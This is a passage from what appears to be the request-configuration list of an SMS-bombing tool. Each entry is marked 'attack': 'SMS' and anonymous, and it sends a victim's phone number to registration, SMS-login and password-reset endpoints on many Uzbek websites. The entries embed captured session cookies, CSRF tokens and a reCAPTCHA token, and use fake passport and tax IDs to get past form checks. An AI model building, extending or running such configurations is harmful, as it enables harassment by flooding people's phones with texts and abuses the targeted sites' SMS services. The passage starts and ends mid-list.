            'headers': {'authority': 'allgood.uz', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://allgood.uz', 'referer': 'https://allgood.uz/register', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent()[1],},
            'data': {'_token': 'OzD8DL3YjVBMP1cM0y3wxS2tFNtXISWYSQbG5G46', 'first_name': 'User', 'phone_number': f'+{number}', 'cookieNameTransaction': '', 'password': 'kyw-BmG-8bq-uRt', 'password_confirmation': 'kyw-BmG-8bq-uRt',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Brandmix.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://brandmix.uz/register/form',
            'cookies': {'PHPSESSID': '9tmtchseqto874natjnc6em9e3', '_ym_uid': '1686384658823911285', '_ym_d': '1686384658', '_gid': 'GA1.2.1219856757.1686384658', '_ym_visorc': 'w', '_ym_isad': '1', 'supportOnlineTalkID': 'Dgdro0T1tIofynu7XdkooMFUMGNgQNrk', '_gat_gtag_UA_191867370_1': '1', '_gat_gtag_UA_207031735_1': '1', '_ga': 'GA1.1.1471870542.1686384658', '_ga_Z9DFQJESR3': 'GS1.1.1686384658.1.1.1686384726.0.0.0', '_ga_FKZ7DPTSDP': 'GS1.1.1686384658.1.1.1686384726.0.0.0',},
            'headers': {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Cache-Control': 'max-age=0', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://brandmix.uz', 'Referer': 'https://brandmix.uz/register/form', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'profile[firstName]': 'User', 'profile[lastName]': 'Name', 'profile[phoneNumber]': f'+{number}', 'password[first]': 'Stz-2pi-pxF-2xx', 'password[second]': 'Stz-2pi-pxF-2xx',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'KitoblarDunyosi.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://kitoblardunyosi.uz/index.php?route=account/register',
            'cookies': {'currency': 'UZS', 'OCSESSID': 'ef44b6ce1f8a7bbc8ba51a928c', 'language': 'ru-ru', 'PHPSESSID': 'eul712eah8hppchbjsgd43bk79',},
            'headers': {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Cache-Control': 'max-age=0', 'Connection': 'keep-alive', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryyZWErsKMlrOBlYiI', 'Origin': 'https://kitoblardunyosi.uz', 'Referer': 'https://kitoblardunyosi.uz/index.php?route=account/register', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'------WebKitFormBoundaryyZWErsKMlrOBlYiI\r\nContent-Disposition: form-data; name="customer_group_id"\r\n\r\n1\r\n------WebKitFormBoundaryyZWErsKMlrOBlYiI\r\nContent-Disposition: form-data; name="firstname"\r\n\r\nUser\r\n------WebKitFormBoundaryyZWErsKMlrOBlYiI\r\nContent-Disposition: form-data; name="lastname"\r\n\r\nName\r\n------WebKitFormBoundaryyZWErsKMlrOBlYiI\r\nContent-Disposition: form-data; name="telephone"\r\n\r\n{str(number)[3:]}\r\n------WebKitFormBoundaryyZWErsKMlrOBlYiI\r\nContent-Disposition: form-data; name="dialcode"\r\n\r\n998\r\n------WebKitFormBoundaryyZWErsKMlrOBlYiI\r\nContent-Disposition: form-data; name="ccode"\r\n\r\nuz\r\n------WebKitFormBoundaryyZWErsKMlrOBlYiI\r\nContent-Disposition: form-data; name="email"\r\n\r\n{email()}\r\n------WebKitFormBoundaryyZWErsKMlrOBlYiI\r\nContent-Disposition: form-data; name="password"\r\n\r\nS4T-uYS-n8t-6Ak\r\n------WebKitFormBoundaryyZWErsKMlrOBlYiI\r\nContent-Disposition: form-data; name="confirm"\r\n\r\nS4T-uYS-n8t-6Ak\r\n------WebKitFormBoundaryyZWErsKMlrOBlYiI\r\nContent-Disposition: form-data; name="newsletter"\r\n\r\n1\r\n------WebKitFormBoundaryyZWErsKMlrOBlYiI\r\nContent-Disposition: form-data; name="g-recaptcha-response"\r\n\r\n03AL8dmw9dDKhIbD0sNMv2VV4yMYyyCLCTJgpgDXmtegJSYJsHiRg5RJuEUZmtZvIkTZZx9s7SVn1UaVbXwYr1fRaYT5hQAbVh_CZ_b4Y78IrcIlRKvlWzjqG4_tMYgbtXBSpefkOlfU0Z7ksIXTZVPBMLwNGK7u5fb6jGeiEa_VkHCZS1JcrlLE0lhVHU-igDPQz4sY3MrKYuKDO7Uigc4P4KMvvvRZABTO3xYvX7t2AzAYgknnH3Hv4wBei_Q8rrq9cmNZieoW2d5lIInabyKJ-beoLods8XgFFPO-E2mGbB_8Y8meiPbH3cD7IYDh9aQuH7eEqJt8X6c3r7LsMpQ5L_MlszZEtsWmCXCQFsGLLunVkW3Vcit9KFBcgVqk54dJz4AUZN5sDPHTOG02R1G5TU86cROhu7FI_VHWSRYyQHmKLbcgOQyFpdZY5Mh0ekOMQhtlcJGf6yj8BVA123NtwRHIbMijoiOeporjp0pI2mCA1abVQXQd35t4AQbHTkRe9N0O3TBpCHQFlAd0SI8x1zRsB5eG7rB-on_yGzvRVj8rqNmXkv0ZzYQRr95njobEaheAD0NpNoFtkO9IBV4VBZjIeOIkhZ67QxMrSU8GD6WG1Ouhe-e4u-CtbeC05g1U4GFXbFGIxTbzU2MtE9VR-SfSSRxzKpKC1ZO9TZhwzjMlkwa3Cypzgx8rGu4teWtGEd7n8Svosb9oQS-x_KlYWPuCAaI2JXfkKB6Ipj3GxUkMjGUJ0En5a-5Rms8ZjBHaGMJJBtqLKfxct1VWazDBDyzi3kTxQJE2WaTbSv4lsfPa7kA522RZk0d7afKZBXKRW1aZvNfa2qySgqRiTNhspvRiiYTSHnUjO9SI-OyXl0fy2IrpVuwFAvCr3xpv6dRXBA-bHB7_3FqRtxCiinbNu7FkGVcqMw47BKVJSenp9IvI0XwqZBoQxdGpsDMQA2Z4eRwMMgkboM3W4XKs0LDKf1NczVOSHZyixs3vXd2my3RfmI7c3_QT5yhqpcz-qTUAvi0F6IQQZy3AqhSyQbkO_aQxBqO8LjNsZBKaY9QdjAf5sEE-Sk7fIY7_xyCtW2xq56L4chd_4hV5OpJzYDQiy8S3aaVVjY4BaKr9F31CmMY6E3B8nWXicRmcl0jHrkCD_aK-MQt65ijW6Dzn1xpKaCMENKCg4hpmTcMqxMHzlbCRHK_aA_xXWENa_ERuHiBzj6pOA3ncQ2armKu8tmxRM7dymuf7yzQU0C7YrVBnHQf5-ji9Nt2ZNXRJ65X-ITpXoRhR-VUbWTplpHczlAUaxwg6Qtsd0fpk6Rhj9oHpEPDopnJ-M_pa2OD1gmaKYJTJgwAJabWvrcidH6NDnW8X-j_9bBbdeUtuZhD83uzvaAV4L-kWf9RFjlmhKFWTvAp8HGrhaBSWyAi4h3bDYixQPYhiyanlLFMOCaL4XV5N7ACbG2BRncHJS83NHcRaFGORI0HTx-2-MP\r\n------WebKitFormBoundaryyZWErsKMlrOBlYiI\r\nContent-Disposition: form-data; name="recaptcha_response"\r\n\r\n03AL8dmw9dDKhIbD0sNMv2VV4yMYyyCLCTJgpgDXmtegJSYJsHiRg5RJuEUZmtZvIkTZZx9s7SVn1UaVbXwYr1fRaYT5hQAbVh_CZ_b4Y78IrcIlRKvlWzjqG4_tMYgbtXBSpefkOlfU0Z7ksIXTZVPBMLwNGK7u5fb6jGeiEa_VkHCZS1JcrlLE0lhVHU-igDPQz4sY3MrKYuKDO7Uigc4P4KMvvvRZABTO3xYvX7t2AzAYgknnH3Hv4wBei_Q8rrq9cmNZieoW2d5lIInabyKJ-beoLods8XgFFPO-E2mGbB_8Y8meiPbH3cD7IYDh9aQuH7eEqJt8X6c3r7LsMpQ5L_MlszZEtsWmCXCQFsGLLunVkW3Vcit9KFBcgVqk54dJz4AUZN5sDPHTOG02R1G5TU86cROhu7FI_VHWSRYyQHmKLbcgOQyFpdZY5Mh0ekOMQhtlcJGf6yj8BVA123NtwRHIbMijoiOeporjp0pI2mCA1abVQXQd35t4AQbHTkRe9N0O3TBpCHQFlAd0SI8x1zRsB5eG7rB-on_yGzvRVj8rqNmXkv0ZzYQRr95njobEaheAD0NpNoFtkO9IBV4VBZjIeOIkhZ67QxMrSU8GD6WG1Ouhe-e4u-CtbeC05g1U4GFXbFGIxTbzU2MtE9VR-SfSSRxzKpKC1ZO9TZhwzjMlkwa3Cypzgx8rGu4teWtGEd7n8Svosb9oQS-x_KlYWPuCAaI2JXfkKB6Ipj3GxUkMjGUJ0En5a-5Rms8ZjBHaGMJJBtqLKfxct1VWazDBDyzi3kTxQJE2WaTbSv4lsfPa7kA522RZk0d7afKZBXKRW1aZvNfa2qySgqRiTNhspvRiiYTSHnUjO9SI-OyXl0fy2IrpVuwFAvCr3xpv6dRXBA-bHB7_3FqRtxCiinbNu7FkGVcqMw47BKVJSenp9IvI0XwqZBoQxdGpsDMQA2Z4eRwMMgkboM3W4XKs0LDKf1NczVOSHZyixs3vXd2my3RfmI7c3_QT5yhqpcz-qTUAvi0F6IQQZy3AqhSyQbkO_aQxBqO8LjNsZBKaY9QdjAf5sEE-Sk7fIY7_xyCtW2xq56L4chd_4hV5OpJzYDQiy8S3aaVVjY4BaKr9F31CmMY6E3B8nWXicRmcl0jHrkCD_aK-MQt65ijW6Dzn1xpKaCMENKCg4hpmTcMqxMHzlbCRHK_aA_xXWENa_ERuHiBzj6pOA3ncQ2armKu8tmxRM7dymuf7yzQU0C7YrVBnHQf5-ji9Nt2ZNXRJ65X-ITpXoRhR-VUbWTplpHczlAUaxwg6Qtsd0fpk6Rhj9oHpEPDopnJ-M_pa2OD1gmaKYJTJgwAJabWvrcidH6NDnW8X-j_9bBbdeUtuZhD83uzvaAV4L-kWf9RFjlmhKFWTvAp8HGrhaBSWyAi4h3bDYixQPYhiyanlLFMOCaL4XV5N7ACbG2BRncHJS83NHcRaFGORI0HTx-2-MP\r\n------WebKitFormBoundaryyZWErsKMlrOBlYiI\r\nContent-Disposition: form-data; name="agree"\r\n\r\n1\r\n------WebKitFormBoundaryyZWErsKMlrOBlYiI--\r\n',
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'BBQBurger.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://customer.api.delever.uz/v1/customers/register',
            'headers': {'authority': 'customer.api.delever.uz', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://bbqburger.uz', 'platform': 'website', 'referer': 'https://bbqburger.uz/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'cross-site', 'shipper': '0d96ff6b-d880-46e9-bb75-43db31eb0d76', 'user-agent': user_agent()[1],},
            'json': {'phone': f'+{number}', 'registration_source': 'website',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'GoPharm.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.gopharm.uz/api/v1/register-captcha',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://gopharm.uz', 'Referer': 'https://gopharm.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'login': number, 'captcha_key': '61917ef9-747a-4607-a049-8888a59d9e2c', 'captcha_value': '8659',},
            'params': {'region': '1', 'lan': 'ru',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Oziqovqat.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'http://oziqovqat.uz/ru/signin',
            'cookies': {'XSRF-TOKEN': 'eyJpdiI6IjFjalRnWlY2YVczWTVmYmJjempvaWc9PSIsInZhbHVlIjoiM0NvVTdpSDVPS0NWakgyVjZFcldiOFVZVVdpOFZ0WS9WUHp0eDB2bFhPYy8zYWNoMFI4Y2V5dFNPNTRJMk9QOFVwWmZJU0R0b0g1RHlKM0VmTWR0ZTUvZCtod1pqTFlIQ2ZoSDluRWR5cTFMN2ladXVJRDF5dm9vNzJ2TGRpaE0iLCJtYWMiOiI0MDkzNTU1NTU0ZDVkOWE2NDgzNTRhZTRjOGU5NDkzMDMzNTk3YTllOTYxMjIxMzgwNWYyMjU2MjBhOTNkOTdkIiwidGFnIjoiIn0%3D', 'laravel_session': 'eyJpdiI6InVZNmVIWDR0c1FzclRsemR4NTlxRkE9PSIsInZhbHVlIjoiZXR5b0NBYWRuSXFlZnoybnNlaURGemZGcm9lQVJGUW9KOGVlVi8rMWRMTm10QStYUS9MR1JpanlNV2RoY3ZkUlAzVEczcGo3WVNNR2l0TWdlVm81QXQ1YTFLY0VOSkppYmVoSmhGRWRKcTA1cmozNTBvcEFVN3dYVnFZVmtqSmQiLCJtYWMiOiI1ZGM2OTY2MTI1M2UxMTc5ZmIxYjZmNmFkN2IxMDdjYzk5NDY4YmMzZTM2NGQ3ODFlYmZlMWI5ZTIyNTZjY2U2IiwidGFnIjoiIn0%3D',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'http://oziqovqat.uz', 'Referer': 'http://oziqovqat.uz/ru', 'User-Agent': user_agent()[1], 'X-CSRF-TOKEN': 'qAE1VryAUPdOEVpVE6je4qApcj85K9cFR6qrM8kx', 'X-Requested-With': 'XMLHttpRequest',},
            'data': {'phone': f'+{number}',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Persey.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://persey.uz/ajax_login.php',
            'headers': {'Accept': 'text/plain, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary9jR0B0XNItyuMEXc', 'Origin': 'https://persey.uz', 'Referer': 'https://persey.uz/ru/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'------WebKitFormBoundary9jR0B0XNItyuMEXc\r\nContent-Disposition: form-data; name="fio"\r\n\r\nUser\r\n------WebKitFormBoundary9jR0B0XNItyuMEXc\r\nContent-Disposition: form-data; name="tel"\r\n\r\n+{number}\r\n------WebKitFormBoundary9jR0B0XNItyuMEXc\r\nContent-Disposition: form-data; name="email"\r\n\r\n\r\n------WebKitFormBoundary9jR0B0XNItyuMEXc\r\nContent-Disposition: form-data; name="psw"\r\n\r\ndskgahsdbkgjn\r\n------WebKitFormBoundary9jR0B0XNItyuMEXc\r\nContent-Disposition: form-data; name="l"\r\n\r\nru\r\n------WebKitFormBoundary9jR0B0XNItyuMEXc\r\nContent-Disposition: form-data; name="from_url"\r\n\r\nhttps://persey.uz/ru/\r\n------WebKitFormBoundary9jR0B0XNItyuMEXc\r\nContent-Disposition: form-data; name="act"\r\n\r\nreg\r\n------WebKitFormBoundary9jR0B0XNItyuMEXc--\r\n',
            # Регистрация по номеру (без смс)
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Persey.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://persey.uz/ru/forgot',
            'headers': {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Cache-Control': 'max-age=0', 'Connection': 'keep-alive', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryd1T2kPtFHqjnOUio', 'Origin': 'https://persey.uz', 'Referer': 'https://persey.uz/ru/forgot', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'------WebKitFormBoundaryd1T2kPtFHqjnOUio\r\nContent-Disposition: form-data; name="tel"\r\n\r\n+{number}\r\n------WebKitFormBoundaryd1T2kPtFHqjnOUio\r\nContent-Disposition: form-data; name="submit99"\r\n\r\nsend_tel\r\n------WebKitFormBoundaryd1T2kPtFHqjnOUio--\r\n',
            # Восстановление пароля по смс
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'AlifNasiya.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://gw.alifnasiya.uz/alifnasiya/auth/request-registration',
            'headers': {'authority': 'gw.alifnasiya.uz', 'accept': 'application/json', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'locale': 'ru', 'origin': 'https://alifnasiya.uz', 'referer': 'https://alifnasiya.uz/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1],},
            'json': {'phone': number, 'passport_id': 'AA1234564', 'birth_date': '11.11.1991',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': '100k.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.100k.uz/api/auth/sms-login',
            'headers': {'Accept': 'aplication/json', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Authorization': 'Bearer null', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://adv.100k.uz', 'Referer': 'https://adv.100k.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'phone': f'+{number}', 'username': f'+{number}', 'password': 'zxfcgbhjklm,',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Uzsti.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://admin.uzsti.uz/api/v1/register',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json;charset=UTF-8', 'Origin': 'https://uzsti.uz', 'Referer': 'https://uzsti.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'password': 'yjfghdfjdtj', 'phone': str(number)[3:], 'is_corporate': 1, 'company': 'dddddfg', 'city': '143', 'tin': '984651689',},
            # Регистрация как юридическое лицо
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Uzsti.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://admin.uzsti.uz/api/v1/register',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json;charset=UTF-8', 'Origin': 'https://uzsti.uz', 'Referer': 'https://uzsti.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'username': 'User Names Name', 'password': 'sfdghfndgf', 'phone': str(number)[3:], 'is_corporate': 0, 'city': '204', 'tin': 'AA1234564',},
            # Регистрация как физическое лицо
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Uzsti.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://admin.uzsti.uz/api/v1/reset-psw',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json;charset=UTF-8', 'Origin': 'https://uzsti.uz', 'Referer': 'https://uzsti.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'params': {'phone': number,},},
            'params': {'phone': str(number)[3:],},
            # Восстановление пароля по смс
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Chehol.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.chehol.uz/api/v1/user/auth/',
            'headers': {'authority': 'api.chehol.uz', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'content-type': 'application/json', 'origin': 'https://chehol.uz', 'referer': 'https://chehol.uz/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-site', 'user-agent': user_agent()[1],},
            'json': {'username': f'+{number}',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'web.ATTO.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://web.atto.uz/client/send-code',
            'cookies': {'attouz_session': 'dFZ4aMWJN0Lo15otrGzNqdIOtGhc9A6RtUqTxbcW', 'XSRF-TOKEN': 'eyJpdiI6Imo5TGtcL0tjaWVjQ2tLb0g4NTZnOTlRPT0iLCJ2YWx1ZSI6Ind0MzRSVWpRRE13RkxsVmcwRlg3Mk1ZOFRPcnVZVW1SSlhjb2RueHZkdFZ6WHRGbGhxWnNjVjkzaHUwYUREWnB5Mm9HUWNwRDlaaUxDRWhPSjlRY29UQlZiM1hucFc1OFJ0eHNcL2RGUisxR0M4ZkJvblpjbzF5em9OMGRmRHVscyIsIm1hYyI6ImI4YjRiZThjZmEwOGQzOTNjYTQwYmUwYTBkYWEzMjMwN2ZmN2JlMjJjYjY4YWM2Mzc2YjUyYzNlZDgwN2I1NDYifQ%3D%3D',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://web.atto.uz', 'Referer': 'https://web.atto.uz/ru', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-CSRF-TOKEN': 'ZxKtLm31BW3RnW55etPSGRXGZJxpA7gA6CsXUUFU', 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'phoneNumber=({str(number)[3:5]}) {str(number)[5:8]}-{str(number)[8:10]}-{str(number)[10:13]}&fullName=User&password=fvj-qnA-E9G-VEL!&confirm_password=fvj-qnA-E9G-VEL!',
            # Регистрация по номеру
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'web.ATTO.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://web.atto.uz/client/send-code-password',
            'cookies': {'attouz_session': 'dFZ4aMWJN0Lo15otrGzNqdIOtGhc9A6RtUqTxbcW', 'XSRF-TOKEN': 'eyJpdiI6IkZEQndsdGZBeHRVMDNwZEdBcmsxbUE9PSIsInZhbHVlIjoidnVUVHA2MUNZZHRvZXUzMjNlSXJ6QlwvdlZ3dks0SFh4MVBkb1pIakx3OENlUGN2OHo5TEc4c2c4T0FUaTJIWExUamQ3VlFEOFwva1lzZXcrQUN4RmV3VHUwSWptNjN4ZVlka0ZRd0R6QXpKaUZxMThxNW02Rkx4T2IrU2Q2NHp0ZiIsIm1hYyI6Ijg4ZjIwMjUxNTgyOWVjM2I0YTYyOWVmYjdkN2JjZTYwYzhmNzZjYmFjNGNlN2Q5YTE0MmZkODk1ZjdlNjI0OTQifQ%3D%3D',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://web.atto.uz', 'Referer': 'https://web.atto.uz/ru', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-CSRF-TOKEN': 'ZxKtLm31BW3RnW55etPSGRXGZJxpA7gA6CsXUUFU', 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'phoneNumber=({str(number)[3:5]}) {str(number)[5:8]}-{str(number)[8:10]}-{str(number)[10:13]}&verificationCode=&password=',
            # Восстановление пароля по смс коду (если акк есть)
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'TTS.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.cabinet.tts.uz/api/v1/accounts/get/verify/code/',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9,cy;q=0.8,uz;q=0.7', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://cabinet.tts.uz', 'Referer': 'https://cabinet.tts.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'phone_number': number, 'password_reset': False,},
        },
        {
            'info': {'country': 'UZ', 'attack': 'SMS', 'website': 'Beelinetv.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.beelinetv.uz/v1/users.json',
